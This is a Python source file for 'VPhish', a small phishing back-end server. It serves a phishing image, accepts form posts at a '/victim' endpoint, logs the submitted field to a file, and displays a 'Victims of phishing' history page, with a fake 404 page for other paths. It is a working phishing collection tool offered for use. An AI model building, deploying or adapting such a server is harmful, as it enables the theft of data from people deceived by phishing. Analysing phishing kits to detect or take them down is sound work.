import io
import cgi
from threading import Thread
from socketserver import ThreadingMixIn
from http.server import HTTPServer, BaseHTTPRequestHandler

HOST = "127.0.0.1"
PORT = 8787

def write_log(addr):
  try:
    file = open('log.txt','a+')
    file.write(addr + '\t' + '\n')
    file.close()   
  except FileNotFoundError:
    print('Error opening the file')

def get_history():
  try:
    log = open('log.txt', 'r')
    contents = log.readlines()
    history = '''
<html>
<head>
<meta charset="utf-8">
<title>VPhish</title>
<style type="text/css">
    body {
		font-family: sans-serif;
		font-family: "Quicksand", sans-serif;
		color: #333;
		text-indent: 1.5em;
		font-size: 1.1em;
		background-color: #eee;
		width: 96vw;
		max-width: 700px;
		margin: 0 auto;
	  }
	  h1 {
		font-size: 3em;
		margin-bottom: 0.2em;
		color: black;
	  }
</style>
</head>
  <body>
    <center>
      <h1>Victims of phishing:</h1>
          <p>No history</p>
    </center>
  </body>
</html>
        '''
    buf = io.StringIO(history) 
    page = buf.read(1024)
    data = ''
    while (page):
      data += page
      page= buf.read(1024)
    log.close()
    data = data.replace('<p>No history</p>','<br>'.join(contents))
    return data
  except FileNotFoundError:
    print('Error opening the file')

class Handler(BaseHTTPRequestHandler):
  def do_POST(self):
    if self.path.endswith('/victim'):
      ctype, pdict = cgi.parse_header(self.headers['content-type'])
      pdict ['boundary'] = bytes(pdict['boundary'], "utf-8")
      if ctype == 'multipart/form-data':
        fields = cgi.parse_multipart(self.rfile, pdict)
        user = fields.get('task')
        write_log(str(user))
                
  def do_GET(self):
    if self.path.endswith('/phishing.html'):
      with open('phishing.jpg', 'rb') as output_file:
        self.send_response(200)
        self.send_header('content-type', 'image/jpg')
        self.end_headers()
        self.wfile.write(output_file.read())
    elif self.path.endswith('/history.html'):
        self.send_response(200)
        self.send_header('content-type', 'text/html')
        self.end_headers()
        data = get_history()
        self.wfile.write(data.encode())
    else:
        self.send_response(200)
        self.send_header('content-type', 'text/html')
        self.end_headers()
        page = '''
<html>
<head>
  <meta charset="utf-8">
  <title>ERROR</title>
  <style type="text/css">
    html,
    body {
      margin: 0;
      padding: 0;
      height: 100%;
    }
    body {
      font-family: "Whitney SSm A", "Whitney SSm B", "Helvetica Neue", Helvetica, Arial, Sans-Serif;
      background-color: #eee;
      color: black;
      -moz-font-smoothing: antialiased;
      -webkit-font-smoothing: antialiased;
    }
    .error-container {
      text-align: center;
      height: 100%;
    }
    .error-container h1 {
      margin: 0;
      font-size: 130px;
      font-weight: 300;
    }
    @media (min-width: 480px) {
      .error-container h1 {
        position: relative;
        top: 50%;
        -webkit-transform: translateY(-50%);
        -ms-transform: translateY(-50%);
        transform: translateY(-50%);
      }
    }
    @media (min-width: 768px) {
      .error-container h1 {
        font-size: 220px;
      }
    }
  </style>
</head>
  <body>
    <div class="error-container">
      <h1>404</h1>
    </div>
  </body>
</html>
'''     
        self.wfile.write(page.encode())
            
class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
  daemon_threads = True
    
def main(port):
  server = ThreadingHTTPServer((HOST,port), Handler)
  server.serve_forever()       
    
if __name__ == '__main__':
  print("__     ______  _     _     _     ")
  print("\ \   / /  _ \| |__ (_)___| |__  ")
  print(" \ \ / /| |_) | '_ \| / __| '_ \ ")
  print("  \ V / |  __/| | | | \__ \ | | |")
  print("   \_/  |_|   |_| |_|_|___/_| |_|")
  print("")
  print('The server is running on {host} use Port {port} ...'.format(host=HOST,port=PORT))
  print("To stop the server, press Ctrl+C")
  Thread(target=main, args=[PORT]).start()